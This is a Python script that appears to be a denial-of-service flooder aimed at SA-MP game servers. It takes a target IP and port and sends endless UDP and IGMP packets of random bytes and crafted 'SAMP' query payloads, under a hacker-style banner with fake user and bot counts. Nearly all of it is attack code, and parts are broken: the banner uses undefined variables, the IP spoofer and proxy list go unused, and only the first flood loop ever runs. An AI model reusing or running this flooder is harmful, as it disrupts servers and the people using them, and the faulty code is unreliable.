#Since : 25-07-2022
#-------[ ALL IMPORT ]-------#
import socket
import struct
import codecs
import sys
import threading
import random
import time
import os
#-------[ ALL SETTINGS ]-------#
ip = sys.argv[1]
port = sys.argv[2]

#ip = str(input("IP TARGET:"))
#port = int(input("PORT TARGET:"))

fake_ip = '66.118.234.34:22'

proxysy = open('Lex.txt').readlines()
bots = len(proxysy)
user = ('ADMIN')
#---------------------[ Randomlex CODE ]---------------------#
Randomlex = [
 b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
 b'SAMP\x958\xe1\xa9a\x1ec',
 b'SAMP\x958\xe1\xa9a\x1ei',
 b'SAMP\x958\xe1\xa9a\x1er',
 b'SAMP\x958\xe1\xa9a\x1ev',
 b'SAMP\x958\xe1\xa9a\x1eg',
 b'\x08\x1eb\xda',
 b'\x08\x1eb\xda',
 b'\x02\x1e\xfdS',
 b'\x08\x1eM\xda',
 b'\x02\x1e\xfd@',
 b'\x08\x1e~\xda'
 ]
prot = (random.randint(200,350))
sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Bot Connected [{}] | Username : {}\x07".format (prot,bots,user))

os.system("clear")
#---------------------[ BANNER'S ]---------------------
print(f"""


\033[38;5;63m                    ╔════════════════════════════════════════╗
                              \033[38;5;208m╦  ╔═╗═╗ ╦  ╔═╗╔═╗╔╦╗╔═╗       
                              \033[38;5;181m║  ║╣ ╔╩╦╝  ╚═╗╠═╣║║║╠═╝       
                              \033[38;5;208m╩═╝╚═╝╩ ╚═  ╚═╝╩ ╩╩ ╩╩
\033[38;5;63m                    ╚═══╦════════════════════════════════╦═══╝
\033[38;5;63m                        ║      \033[0mSUBSCRIBE  @LEX SAMP      \033[38;5;63m║
\033[38;5;63m                ╔═══════╩════════════════════════════════╩════════╗
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mIP SERVER   \033[38;5;63m         [\033[0m•\033[38;5;63m] \033[38;5;208m{host}\033[0m:\033[38;5;208m{port}
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mTIME   \033[38;5;63m              [\033[0m•\033[38;5;63m] \033[38;5;208m{times}
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mMETHODS   \033[38;5;63m           [\033[0m•\033[38;5;63m] \033[38;5;208mEXPLOIT
\033[38;5;63m                ╚════╦══════════════════════════════════════╦═════╝
\033[38;5;63m                  ═══╩══════════════════════════════════════╩═══
\033[0m

""")

def spoofer():
    addr = [192, 168, 0, 1]
    d = '4.240.112.191'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

#--------------[ START DDOS BY LEXYY ]--------------#
def xxxxxxx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1081) #1081
        pack = random._urandom(999) #666
        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
        msg = Randomlex[random.randrange(0, 9)]
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(pack, (ip, int(port)))
        sock.sendto(payload, (ip, int(port)))
        sock.sendto(msg, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))

def xxxxxx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        bytes = random._urandom(1460)
        payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(payload, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))

def xxxxx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1081) #1081
        pack = random._urandom(999) #666
        msg = Randomlex[random.randrange(0, 9)]
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(pack, (ip, int(port)))
        sock.sendto(msg, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))

def xxxx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        bytes = random._urandom(1460)
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))

def xxx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1081) #1081
        pack = random._urandom(666) #666
        msg = Randomlex[random.randrange(0, 9)]
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(pack, (ip, int(port)))
        sock.sendto(msg, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))
                
def xx():
    while True:
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        bytes = random._urandom(1460)
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))

def x():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1081) #1081
        pack = random._urandom(999) #666
        msg = Randomlex[random.randrange(0, 9)]
        sock.sendto(bytes, (ip, int(port)))
        sock.sendto(pack, (ip, int(port)))
        sock.sendto(msg, (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[0], (ip, int(port)))
        sock.sendto(Randomlex[1], (ip, int(port)))
        sock.sendto(Randomlex[2], (ip, int(port)))
        sock.sendto(Randomlex[3], (ip, int(port)))
        sock.sendto(Randomlex[4], (ip, int(port)))
        sock.sendto(Randomlex[5], (ip, int(port)))
        sock.sendto(Randomlex[6], (ip, int(port)))
        sock.sendto(Randomlex[7], (ip, int(port)))
        sock.sendto(Randomlex[8], (ip, int(port)))
        sock.sendto(Randomlex[9], (ip, int(port)))
        sock.sendto(Randomlex[10], (ip, int(port)))
        sock.sendto(Randomlex[11], (ip, int(port)))
        
              
              
#---------------------[ AUTO RUN ]---------------------#
if __name__ == '__main__':
    try:
      xxxxxxx()
      xxxxxx()
      xxxxx()
      xxxx()
      xxx()
      xx()
      x()

#---------------------[ CLOSING ]---------------------#
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[0;37;40mclosed")
